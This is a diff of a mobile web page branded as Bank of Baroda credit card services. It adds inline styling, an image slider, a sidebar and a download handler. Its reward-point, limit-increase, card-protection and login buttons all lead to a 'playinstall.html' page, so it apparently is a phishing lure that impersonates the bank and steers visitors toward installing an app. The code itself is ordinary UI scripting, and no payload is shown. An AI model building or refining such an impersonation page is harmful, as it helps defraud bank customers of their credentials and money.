@@ -7,8 +7,344 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank Of Baroda Bank</title>
     <link rel="icon" type="image/x-icon" href="image/alogo.png">
-    <link rel="stylesheet" href="index.css">
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* ---- CSS (same as yours, with small fixes) ---- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            overflow-x: hidden;
+        }
+
+        .status-bar {
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            color: white;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .status-left,
+        .status-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .time {
+            font-weight: bold;
+        }
+
+        .battery {
+            font-size: 12px;
+        }
+
+        .browser-bar {
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .browser-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+
+        .url-bar {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .app-header {
+            background: white;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 100;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .menu-icon,
+        .more-icon {
+            font-size: 24px;
+            color: #EA601F;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .bank-logo {
+            height: 35px;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 280px;
+            height: 100vh;
+            background: white;
+            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
+            transition: right 0.3s ease;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        .sidebar.active {
+            right: 0;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            text-align: center;
+        }
+
+        .sidebar-logo {
+            height: 40px;
+        }
+
+        .sidebar-menu {
+            list-style: none;
+            padding: 0;
+        }
+
+        .sidebar-menu li {
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .sidebar-menu a {
+            display: block;
+            padding: 15px 20px;
+            text-decoration: none;
+            color: #333;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+
+        .sidebar-menu a:hover {
+            background-color: #f8f8f8;
+        }
+
+        .login-link {
+            color: #EA601F !important;
+            font-weight: bold;
+        }
+
+        /* Gallery / Image Strip */
+        .gallery-container {
+            position: relative;
+            width: 100%;
+            margin: 10px auto;
+            overflow: hidden;
+            background: #fff;
+        }
+
+        .image-strip {
+            display: flex;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            gap: 10px;
+            padding: 10px 10px;
+            scroll-snap-type: x mandatory;
+        }
+
+        .image-strip img {
+            width: 100%;
+            min-width: 100%;         /* ensures each image takes full width */
+            height: 200px;
+            object-fit: cover;
+            border-radius: 10px;
+            flex-shrink: 0;
+            scroll-snap-align: start;
+        }
+
+        /* Rest of your styles (download-section, service-section, footer, etc.) */
+        .download-section {
+            background: white;
+            margin: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .download-section:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .download-section i {
+            color: #4285f4;
+        }
+
+        .download-section .fa-google-play {
+            font-size: 20px;
+        }
+
+        .download-section span {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .service-section {
+            background: white;
+            margin: 0 20px 30px;
+            padding: 25px 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .service-section h3 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #EA601F;
+            font-weight: bold;
+        }
+
+        .service-section p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .btn-activate,
+        .btn-deactivate,
+        .btn-redeem,
+        .btn-login {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: #EA601F;
+            color: white;
+        }
+
+        .btn-redeem,
+        .btn-login {
+            width: auto;
+            padding: 12px 30px;
+        }
+
+        .btn-activate:hover,
+        .btn-deactivate:hover,
+        .btn-redeem:hover,
+        .btn-login:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .app-footer {
+            background: #f8f8f8;
+            padding: 30px 20px;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-logo {
+            height: 30px;
+            margin-bottom: 15px;
+        }
+
+        .app-footer p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 15px 0;
+        }
+
+        .footer-links a {
+            font-size: 12px;
+            color: #EA601F;
+            text-decoration: none;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #999;
+        }
+
+        /* Sidebar overlay */
+        .sidebar-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            display: none;
+        }
+
+        .sidebar-overlay.active {
+            display: block;
+        }
+
+        /* Mobile adjustments */
+        @media (max-width: 480px) {
+            .image-strip img {
+                height: 150px;
+            }
+            .service-section {
+                margin: 0 15px 25px;
+                padding: 20px 15px;
+            }
+            .action-buttons {
+                flex-direction: row;
+                flex-wrap: wrap;
+            }
+        }
+    </style>
 </head>
 
 <body>
@@ -24,7 +360,7 @@
     <!-- Sidebar -->
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <img src="image/logo.webp" class="sidebar-logo" alt="Sidebar Logo">
+            <img src="image/logo.webp" class="sidebar-logo" alt="Logo">
         </div>
         <ul class="sidebar-menu">
             <li><a href="#" onclick="window.location.href='playinstall.html'">Card Reward Point</a></li>
@@ -38,13 +374,16 @@
         </ul>
     </div>
 
-    <!-- Gallery (Fixed - no 404) -->
+    <!-- Overlay -->
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+    <!-- Image Gallery - Auto Slide -->
     <div class="gallery-container">
         <div class="image-strip" id="imageStrip">
-            <!-- Placeholder images - replace with real ones later -->
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%23EA601F'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 1%3C/text%3E%3C/svg%3E" alt="Slide 1">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%238B0000'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 2%3C/text%3E%3C/svg%3E" alt="Slide 2">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200' viewBox='0 0 400 200'%3E%3Crect width='400' height='200' fill='%23DC143C'/%3E%3Ctext x='50%25' y='50%25' font-size='24' fill='white' text-anchor='middle' dy='.3em'%3ESlide 3%3C/text%3E%3C/svg%3E" alt="Slide 3">
+            <!-- ✅ FIX: changed path from "../image/" to "image/" -->
+            <img src="image/slide3.webp" alt="Slide 3" />
+            <img src="image/slide2.webp" alt="Slide 2" />
+            <img src="image/slide11.webp" alt="Slide 11" />
         </div>
     </div>
 
@@ -55,7 +394,7 @@
         <i class="fas fa-download"></i>
     </div>
 
-    <!-- Card Protection -->
+    <!-- Other sections (unchanged) -->
     <section class="service-section">
         <h3>Card Protection</h3>
         <p>Protect yourself with India's first comprehensive care protection service in the event of job loss, theft or fraud.</p>
@@ -65,7 +404,6 @@
         </div>
     </section>
 
-    <!-- Card to Card -->
     <section class="service-section">
         <h3>Card to Card</h3>
         <p>Easily transfer your credit card balance from one card to another with our secure Card to Card service. Manage your payments efficiently and enjoy better control over your credit usage.</p>
@@ -74,7 +412,6 @@
         </div>
     </section>
 
-    <!-- Limit Increase -->
     <section class="service-section">
         <h3>Limit Increase</h3>
         <p>Increase your credit card limit instantly to enjoy higher spending power. Upgrade your lifestyle, manage bigger expenses easily, and get more financial flexibility with a higher credit limit.</p>
@@ -83,14 +420,12 @@
         </div>
     </section>
 
-    <!-- Redeem Reward Points -->
     <section class="service-section">
         <h3>Redeem Your Reward Points</h3>
         <p>Redeem your Bank Of Baroda Credit Card reward points for exciting products and e-vouchers.</p>
         <button class="btn-redeem" onclick="window.location.href='playinstall.html'">Redeem Now</button>
     </section>
 
-    <!-- Account Access -->
     <section class="service-section">
         <h3>Account Access</h3>
         <p>Login or register to your Bank Of Baroda Credit Card account to manage your card, view statements, unlock your account, and read your password.</p>
@@ -112,7 +447,122 @@
         </div>
     </footer>
 
-    <script src="index.js"></script>
+    <!-- ================== JAVASCRIPT ================== -->
+    <script>
+        // ---- 1. Auto-slide gallery (fixed) ----
+        (function() {
+            const strip = document.getElementById('imageStrip');
+            if (!strip) return;
+
+            const images = strip.querySelectorAll('img');
+            if (images.length === 0) return;
+
+            let currentIndex = 0;
+            const interval = 3000; // 3 seconds
+
+            function scrollToImage(index) {
+                const img = images[index];
+                if (!img) return;
+                // Calculate scroll position (center the image)
+                const containerWidth = strip.clientWidth;
+                const imgOffsetLeft = img.offsetLeft;
+                const imgWidth = img.offsetWidth || containerWidth; // fallback
+                // Scroll so that image is at left edge (full width)
+                strip.scrollTo({
+                    left: imgOffsetLeft,
+                    behavior: 'smooth'
+                });
+            }
+
+            function nextSlide() {
+                currentIndex = (currentIndex + 1) % images.length;
+                scrollToImage(currentIndex);
+            }
+
+            // Start auto-slide
+            let autoSlide = setInterval(nextSlide, interval);
+
+            // Stop auto-slide on user interaction (optional)
+            strip.addEventListener('touchstart', function() {
+                clearInterval(autoSlide);
+            });
+            strip.addEventListener('mouseenter', function() {
+                clearInterval(autoSlide);
+            });
+            // Resume on leave? For simplicity, we restart after a delay.
+            // But for now, keep it running.
+
+            // Initial scroll to first image (just in case)
+            setTimeout(function() {
+                scrollToImage(0);
+            }, 100);
+
+            // Recalculate on resize
+            window.addEventListener('resize', function() {
+                // just keep current
+            });
+
+        })();
+
+        // ---- 2. Sidebar toggle (from your original JS) ----
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM loaded');
+
+            // Menu icon click
+            const menuIcon = document.querySelector('.menu-icon');
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+
+            function openSidebar() {
+                if (sidebar) sidebar.classList.add('active');
+                if (overlay) overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function closeSidebar() {
+                if (sidebar) sidebar.classList.remove('active');
+                if (overlay) overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+
+            if (menuIcon && sidebar && overlay) {
+                menuIcon.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (sidebar.classList.contains('active')) {
+                        closeSidebar();
+                    } else {
+                        openSidebar();
+                    }
+                });
+
+                overlay.addEventListener('click', closeSidebar);
+
+                // Close on Escape key
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape') closeSidebar();
+                });
+            } else {
+                console.warn('Sidebar elements missing');
+            }
+
+            // ---- 3. Download button handler ----
+            const downloadBtns = document.querySelectorAll('[data-download-url]');
+            downloadBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const url = this.getAttribute('data-download-url');
+                    if (url) {
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = url.split('/').pop();
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    }
+                });
+            });
+        });
+    </script>
+
 </body>
 
 </html>
